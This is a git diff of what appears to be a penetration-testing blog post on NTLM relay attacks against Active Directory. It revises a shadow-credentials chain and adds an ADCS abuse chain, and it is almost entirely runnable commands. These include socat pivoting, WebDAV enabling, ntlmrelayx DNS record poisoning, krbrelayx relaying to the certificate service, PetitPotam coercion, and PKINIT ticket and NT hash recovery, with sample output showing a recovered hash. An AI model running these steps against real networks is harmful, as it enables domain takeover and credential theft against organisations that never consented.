@@ -1,12 +1,12 @@
 ---
 title: "NTLM Relay Attack"
-date: 2024-8-3
+date: 2025-4-1
 tags: ["Shadow Credentials", "Attack Chain", "Ntlm", "Ldap", "Pass-The-Hash", "Impacket", "Ntlmreplay", "Petitpotam", "Active Directory", "Windows", "ADCS", "Webdav", "Pkinit", "Ticket Granting Ticket"]
 ---
 
-### NTLM Relay Attack
+### Abuse #1: Add Shadow Credential
 
-#### 1. Run socat to redirect traffic (In Windows Target)
+#### 1. Run socat to Redirect Traffic (Inside Pivoting Node)
 
 ```console
 # Upload socat.zip and unzip
@@ -29,7 +29,7 @@ the public mailing list cygwin@cygwin.com
 
 <small>*Ref: [socat](https://codeload.github.com/StudioEtrange/socat-windows/zip/refs/heads/master)*</small>
 
-#### 2. Enable webdav (In Windows Target)
+#### 2. Enable Webdav (Inside Windows Target) \[Optional\]
 
 ```console
 $Source = @"
@@ -109,7 +109,7 @@ Add-Type -TypeDefinition $Source -Language CSharp -CompilerParameters $compilerP
 C:\xampp\htdocs\enable_webdav.ps1
 ```
 
-#### 3. Start ntlmrelayx listener (In Local Linux)
+#### 3. Start ntlmrelayx Listener (In Local Linux)
 
 #### Get impacket fork : Add Shadow Credentials Commands to Ntlmrelayx's Interactive LDAP Shell
 
@@ -215,7 +215,7 @@ Trying pipe lsarpc
 
 <small>*Ref: [PetitPotam](https://github.com/topotam/PetitPotam)*</small>
 
-#### 5. Connect to LDAP shell (In Local Linux)
+#### 5. Connect to LDAP Shell (In Local Linux)
 
 ```console
 rlwrap nc 127.0.0.1 11000
@@ -229,7 +229,7 @@ Type help for list of commands
 ```
 
 ```console
-clear_shadow_creds <SOCAT_HOSTNAME>$
+clear_shadow_creds <TARGET_HOSTNAME>$
 ```
 
 ```console {class="sample-code"}
@@ -242,13 +242,13 @@ Shadow credentials cleared successfully!
 
 ```console
 # Take Note of pfx path and password
-set_shadow_creds <SOCAT_HOSTNAME>$
+set_shadow_creds <TARGET_HOSTNAME>$
 ```
 
-#### 6. Request TGT using pfx file (In Local Linux)
+#### 6. Request a TGT Using pfx File (In Local Linux)
 
 ```console
-python3 gettgtpkinit.py '<DOMAIN>/<SOCAT_HOSTNAME>$' <SOCAT_HOSTNAME>.ccache -cert-pfx <RANDOM_CHARS>.pfx -pfx-pass <RANDOM_CHARS_PASSWORD> -dc-ip <DC>
+python3 gettgtpkinit.py '<DOMAIN>/<TARGET_HOSTNAME>$' <TARGET_HOSTNAME>.ccache -cert-pfx <RANDOM_CHARS>.pfx -pfx-pass <RANDOM_CHARS_PASSWORD> -dc-ip <DC_IP>
 ```
 
 ```console {class="sample-code"}
@@ -270,7 +270,7 @@ INFO:minikerberos:Saved TGT to file
 #### 7. Get NT Hash (In Local Linux)
 
 ```console
-python3 getnthash.py '<DOMAIN>/<SOCAT_HOSTNAME>$' -key <AS_REP_ENC_KEY>
+python3 getnthash.py '<DOMAIN>/<TARGET_HOSTNAME>$' -key <AS_REP_ENC_KEY>
 ```
 
 ```console {class="sample-code"}
@@ -281,4 +281,53 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 [*] Requesting ticket to self with PAC
 Recovered NT Hash
 59920e994636168744039017dcf49e54
+```
+
+<br>
+
+---
+
+### Abuse #2: Abusing Active Directory Certificate Services
+
+#### 1. Run socat to Redirect Traffic (Inside Pivoting Node)
+
+```console
+./socat tcp-listen:8090,reuseaddr,fork tcp:<LOCAL_IP>:80 &
+```
+
+#### 2. DNS Poisoning
+
+```console
+python3 examples/ntlmrelayx.py -t "ldap://<DC_IP>" --no-smb-server --no-dump --no-da --no-acl --no-validate-privs --add-dns-record '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <LOCAL_IP>
+```
+
+#### 3. Add hostnames to /etc/hosts
+
+```console
+<DC_IP> <DC_HOSTNAME>.<DOMAIN>
+<TARGET_IP> <TARGET_HOSTNAME>.<DOMAIN>
+```
+
+#### 4. Relay NTLM to ADCS
+
+```console
+python3 krbrelayx.py -t 'https://<DC_HOSTNAME>.<DOMAIN>/certsrv/certfnsh.asp' --adcs -v '<TARGET_HOSTNAME>$'
+```
+
+#### 5. Run PetitPotam
+
+```console
+proxychains4 -q python3 PetitPotam.py -u '<UESR>' -p '<PASSWORD>' -d <DOMAIN> '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <TARGET_HOSTNAME>.<DOMAIN>
+```
+
+#### 6. Request a TGT Using pfx file
+
+```console
+python3 gettgtpkinit.py -cert-pfx '<TARGET_HOSTNAME>$.pfx' '<DOMAIN>/<TARGET_HOSTNAME>$' '<TARGET_HOSTNAME>$.ccache'
+```
+
+#### 7. Get NT Hash
+
+```console
+python3 getnthash.py '<DOMAIN>/<TARGET_HOSTNAME>$' -key <AS_REP_ENC_KEY>
 ```
